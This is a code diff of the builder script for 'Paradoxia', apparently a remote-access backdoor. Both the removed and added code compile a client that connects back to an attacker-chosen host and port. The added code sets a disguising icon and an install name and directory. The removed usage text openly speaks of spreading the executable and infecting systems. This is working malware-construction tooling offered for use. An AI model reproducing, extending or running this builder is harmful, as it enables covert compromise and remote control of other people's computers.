@@ -1,75 +1,68 @@
 """
 
-Generate Agent
+Generate Client
 
 """
 import os
 import subprocess
+import os
+import subprocess
 
-def create_agent(lhost, lport, passwd, mode):
-	
-	if(len(lhost) > 0 and len(lport) > 0 and len(mode) > 0):
-		if(mode == "static"):
-			static = True
-		else:
-			static = False
 
-		os.chdir("bot")
-		with open("clientc.h", "r+") as source_code:
-			source = source_code.read()
-			replace = source.replace("lhost", lhost)
-			freplace = replace.replace("lport", lport)
-			final_replace = freplace.replace("passwd", passwd)
-			with open("client.h", "w") as final:
-				final.write(final_replace)
-				
-		if(os.name == "nt"):
-			if(static == True):
-				print("[+] Building Static BOT which will connect on {lhost}:{lport}.".format(lhost=lhost, lport=lport))
-				subprocess.call(["make", "windows-static"], stdout=open(os.devnull,"w"), stderr=subprocess.STDOUT)
-			else:
-				print("[+] Building BOT which will connect on {lhost}:{lport}.".format(lhost=lhost, lport=lport))
-				subprocess.call(["make", "windows"], stdout=open(os.devnull,"w"), stderr=subprocess.STDOUT)
-		else:
-			if(static == True):
-				print("[+] Building Static BOT which will connect on {lhost}:{lport}.".format(lhost=lhost, lport=lport))
-				subprocess.call(["make", "linux-static"], stdout=open(os.devnull,"w"), stderr=subprocess.STDOUT)
-			else:
-				print("[+] Building BOT which will connect on {lhost}:{lport}.".format(lhost=lhost, lport=lport))
-				subprocess.call(["make", "linux"], stdout=open(os.devnull,"w"), stderr=subprocess.STDOUT)
+def inplace_change(filename, old_string, new_string):
+    # Safely read the input filename using 'with'
+    try:
+        with open(filename) as f:
+            s = f.read()
+            if old_string not in s:
+                #print('"{old_string}" not found in {filename}.'.format(**locals()))
+                return
 
-		os.chdir("..")
-		try:
-			file = "bot/Paradoxia.exe"
-			#os.remove("bot/Paradoxia.h")
-			with open(file, "rb") as backdoor:
-				hello = os.stat(file)
-				print("\n-> Paradoxia.exe | Size : {size} bytes | Path : {path}"
-					.format(size=str(hello.st_size), path=os.path.dirname(os.path.abspath(file))))
-		except FileNotFoundError:
-			print("-> Failed to create Backdoor.")
-		except Exception as es:
-			print("-> Error : " +str(es))
+        # Safely write the changed content, if found in the file
+        with open(filename, 'w') as f:
+            #print('Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals()))
+            s = s.replace(old_string, new_string)
+            f.write(s)
+    except FileNotFoundError:
+        print("[x] File not found : " + filename)
+    except Exception as e:
+        print("[X] Error : " + str(e))
+        
 
-	else:
-		print("""
-		[X] USAGE : build lhost=<lhost> lport=<lport> <static>/<normal>
+def Build(host, port, icon, outfile, install_name, install_dir):
+    try:
+        os.chdir("ParadoxiaClient/ParadoxiaClient")
 
-		LHOST - Ipv4 Address of Server to Connect to.
-		LPORT - Port of Server to Connect to.
-		static - Standalone Executable to run on almost any System.
-		normal - Executable that requires libraries to run.
+        inplace_change("ParadoxiaClient.c", "{{serverhost}}", host)
+        inplace_change("ParadoxiaClient.c", "{{serverport}}", port)
+        inplace_change("paradoxia.h", "{{installname}}", install_name.strip())
+        inplace_change("paradoxia.h", "{{installdir}}", install_dir.strip())
+        inplace_change("makefile", "{{outfilehere}}", outfile)
+        if(icon is not None):
+            if(os.path.isfile(icon)):
+                inplace_change("icon.rc", "{{iconhere}}", icon)
+                subprocess.call(["make", "icon"], stderr=subprocess.STDOUT, stdout = subprocess.DEVNULL)
 
-		EXAMPLES : 
-		[+] build lhost=192.168.0.101 lport=443 static
-		|- Size : Around 2.1 MB.
-		|- This will generate an Executable that you can easily spread 
-			without worrying that it will work or not.
+            else:
+                print("[X] Icon not found : " + icon)
+        else:
+            subprocess.call(["make"], stderr=subprocess.STDOUT, stdout = subprocess.DEVNULL)
 
-		[+] build lhost=192.168.0.101 lport=443 normal
-		|- Size : Around 600 kb.
-		|- This will generate an Executable that you can use for tests
-			on your own PC. Or infect a System which an environment where
-			it can run.
 
-		""")
+        if(os.path.isfile(outfile)):
+            print("[+] Built : {x}".format(x = os.path.abspath(outfile)))
+        else:
+            print("[X] Error building Paradoxia Client.")
+
+    except Exception as e:
+        print("[x] Error : " + str(e))        
+
+    inplace_change("ParadoxiaClient.c", host, "{{serverhost}}")
+    inplace_change("ParadoxiaClient.c", port, "{{serverport}}")
+    if(icon is not None):
+        inplace_change("icon.rc",icon, "{{iconhere}}")
+    inplace_change("makefile", outfile, "{{outfilehere}}")
+    inplace_change("paradoxia.h",  install_name.strip(), "{{installname}}")
+    inplace_change("paradoxia.h", install_dir.strip(), "{{installdir}}")
+    os.chdir("..")
+    os.chdir("..")
